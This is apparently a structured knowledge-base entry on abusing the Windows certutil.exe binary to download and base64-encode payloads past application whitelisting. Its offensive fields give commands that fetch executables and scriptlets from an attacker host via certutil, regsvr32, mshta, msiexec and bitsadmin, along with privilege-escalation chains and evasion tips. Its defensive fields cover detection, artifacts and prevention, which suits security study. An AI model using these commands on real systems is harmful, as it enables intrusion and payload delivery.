examples.label: Download a file to the target

notes:
=== CertUtil — LOLBAS File Transfer and Encoding ===
Certutil.exe is a signed Microsoft binary that doubles as HTTP downloader and base64 encoder/decoder.

=== LOLBAS BACKGROUND ===
LOLBAS = Living Off The Land Binaries, Scripts, and Libraries
Microsoft-signed files native to Windows abused for unintended purposes
Trusted by application whitelisting solutions — effective for AV/AppLocker evasion

=== CERTUTIL CAPABILITIES ===
HTTP file download (main use for file transfer):
  certutil -urlcache -split -f http://ATTACKER_IP/shell.exe C:\Temp\shell.exe
  certutil -urlcache -split -f http://ATTACKER_IP/tool.exe tool.exe

Base64 encoding (convert binary to text for text-only channels):
  certutil -encode C:\Tools\malware.exe C:\Temp\malware.b64
  → Creates base64 file that can be transferred as text

Base64 decoding (restore binary from encoded text):
  certutil -decode C:\Temp\malware.b64 C:\Tools\malware.exe
  → Reconstructs original binary

=== OTHER LOLBAS EXAMPLES ===
rundll32.exe → execute DLL files directly (avoids spawning cmd.exe):
  rundll32.exe C:\malicious.dll,EntryPoint

regsvr32.exe → execute COM scriptlets (AppLocker bypass):
  regsvr32 /u /n /s /i:http://ATTACKER/payload.sct scrobj.dll

mshta.exe → execute HTA files (HTML Application):
  mshta http://ATTACKER/payload.hta

msiexec.exe → execute MSI packages from URL:
  msiexec /quiet /i http://ATTACKER/malicious.msi

=== DETECTION AND EVASION ===
certutil.exe creating network connections = often flagged by EDR
certutil DNS lookups logged in network monitoring
Alternative: PowerShell DownloadFile or DownloadString often less flagged
BitsAdmin also works: bitsadmin /transfer job /download http://ATTACKER/file.exe C:\Temp\file.exe

=== CHAINING CONTEXT ===
certutil download → transfer JuicyPotato/SharpUp/tools to target → exploitation
certutil base64 → transfer binary tools through text-only channels (web shells with limited output)
xp_cmdshell → certutil download → JuicyPotato → SYSTEM (classic MSSQL chain)
Web shell → certutil download → tool staging → privilege escalation chain

=== LOLBAS PROJECT ===
https://lolbas-project.github.io — complete catalog with abuse techniques for each binary

recommended.note: Use it to deliver a payload DLL/binary.

name: Misc - certutil File Transfer & Encoding
description: certutil is a LOLBAS: download files over HTTP and base64 encode/decode them to move payloads past filters.

defense.why_it_works: certutil.exe is a built-in Windows binary (LOLBAS) for certificate operations that can also download files from URLs (-urlcache -split -f) and encode/decode Base64 (-encode/-decode). It is trusted by default, often allowed through application whitelisting, and its network activity may be overlooked compared to PowerShell web downloads.
defense.prerequisites: Shell access. certutil.exe available (default on all Windows). Network access to attacker-hosted HTTP server. Target URL reachable.
defense.impact: File transfer of attack tools or payloads to the target system, bypassing naive download controls. Enables staging of additional exploit tools, persistence mechanisms, or exfiltration helpers.
defense.detection: certutil.exe making outbound HTTP connections (unusual for a certificate utility). certutil execution with -urlcache flag. Network logs: HTTP request from certutil.exe User-Agent. SIEM: certutil network activity alert.
defense.artifacts: Process log: certutil.exe -urlcache -split -f http://... | Network: HTTP request from certutil to external IP | File: downloaded tool in %TEMP% or staging directory
defense.prevention: Block outbound HTTP from non-browser processes on servers via NGFW with application-aware rules. Windows Defender Attack Surface Reduction (ASR) rule: block abuse of exploited vulnerable signed drivers covers certutil. Monitor certutil.exe for network activity. Consider application whitelisting with network restriction rules.
defense.misconfiguration: No outbound HTTP filtering from servers. Application whitelisting allows certutil but no network behavior monitoring. No SIEM alert on certutil network activity.
defense.vulnerable_config:
# File download via certutil:
certutil.exe -urlcache -split -f http://10.10.14.3:8080/winPEAS.exe winPEAS.exe

# Base64 encode/decode to bypass string detection:
certutil -encode input.exe encoded.b64
certutil -decode encoded.b64 output.exe
defense.secure_config:
# Block certutil outbound HTTP (NGFW/proxy):
# Application control: block certutil.exe from making network connections

# Enable ASR rule:
Add-MpPreference -AttackSurfaceReductionRules_Ids 01443614-cd74-433a-b99e-2ecdc07bfc25 -AttackSurfaceReductionRules_Actions Enabled

# Monitor certutil in SIEM:
# Alert: certutil.exe process with network connection established
defense.evasion: Touch only what you need; remove any scheduled task/mounted disk/dropped file you create.
